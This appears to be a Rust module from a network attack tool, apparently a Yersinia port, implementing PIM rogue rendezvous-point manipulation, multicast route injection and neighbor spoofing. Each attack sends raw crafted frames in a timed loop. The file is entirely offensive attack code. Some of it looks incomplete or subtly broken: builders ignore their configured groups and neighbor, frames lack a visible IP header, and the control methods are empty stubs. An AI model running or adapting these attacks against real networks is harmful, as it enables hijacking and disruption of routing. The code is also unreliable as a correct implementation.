//! PIM Attack Implementations
use super::packet::PimPacket;
use async_trait::async_trait;
use std::net::Ipv4Addr;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

#[derive(Debug, Clone)]
pub struct PimRpManipulationAttack {
    pub rogue_rp_address: Ipv4Addr,
    pub priority: u8,
}

impl PimRpManipulationAttack {
    pub fn new(rp_addr: Ipv4Addr) -> Self {
        Self {
            rogue_rp_address: rp_addr,
            priority: 255,
        }
    }
    pub fn build_candidate_rp(&self) -> PimPacket {
        PimPacket::candidate_rp(self.rogue_rp_address, self.priority)
    }
}

#[derive(Debug, Clone)]
pub struct PimRouteInjectionAttack {
    pub multicast_groups: Vec<Ipv4Addr>,
    pub source: Ipv4Addr,
}

impl PimRouteInjectionAttack {
    pub fn new(source: Ipv4Addr) -> Self {
        Self {
            multicast_groups: vec![],
            source,
        }
    }
    pub fn build_join_prune(&self) -> PimPacket {
        PimPacket::join_prune()
    }
}

#[derive(Debug, Clone)]
pub struct PimNeighborSpoofingAttack {
    pub spoofed_neighbor: Ipv4Addr,
}

impl PimNeighborSpoofingAttack {
    pub fn new(neighbor: Ipv4Addr) -> Self {
        Self {
            spoofed_neighbor: neighbor,
        }
    }
    pub fn build_hello(&self) -> PimPacket {
        PimPacket::hello()
    }
}

#[async_trait]
impl Attack for PimRpManipulationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(500);
        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let pim_bytes = self.build_candidate_rp().to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0x01, 0x00, 0x5E, 0x00, 0x00, 0x0D]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4,
                pim_bytes,
            );
            if let Err(_e) = ctx.interface.send_raw(&frame.to_bytes()) {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "PIM RP Manipulation"
    }
}

#[async_trait]
impl Attack for PimRouteInjectionAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(300);
        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let pim_bytes = self.build_join_prune().to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0x01, 0x00, 0x5E, 0x00, 0x00, 0x0D]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4,
                pim_bytes,
            );
            if let Err(_e) = ctx.interface.send_raw(&frame.to_bytes()) {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "PIM Route Injection"
    }
}

#[async_trait]
impl Attack for PimNeighborSpoofingAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_secs(1);
        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let pim_bytes = self.build_hello().to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0x01, 0x00, 0x5E, 0x00, 0x00, 0x0D]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4,
                pim_bytes,
            );
            if let Err(_e) = ctx.interface.send_raw(&frame.to_bytes()) {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "PIM Neighbor Spoofing"
    }
}
